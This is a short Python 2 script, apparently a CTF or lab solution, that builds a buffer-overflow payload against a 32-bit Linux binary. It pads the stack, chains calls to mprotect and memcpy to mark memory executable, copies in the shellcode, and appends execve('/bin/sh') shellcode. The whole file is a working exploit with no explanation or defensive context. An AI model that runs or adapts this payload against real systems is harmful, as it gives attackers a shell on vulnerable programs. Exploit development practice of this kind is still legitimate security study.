import struct

def addr(x):
    return struct.pack("<I",x)

mprotect = 0x80523e0
pop3ret = 0x8048882
memcpy = 0x8051500

padding = "A" * 44
#set memory as rwx
payload = addr(mprotect)
payload += addr(pop3ret)
payload += addr(0x080ca000)
payload += addr(0x1000)
payload += addr(0x7)

payload += addr(memcpy)    
payload += addr(0x080ca000)

payload += addr(0x080ca000)
payload += addr(0xbffff6f4) #stack address different in case of gdb

shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80'

payload += struct.pack('I', len(shellcode))

payload += shellcode

print padding + payload
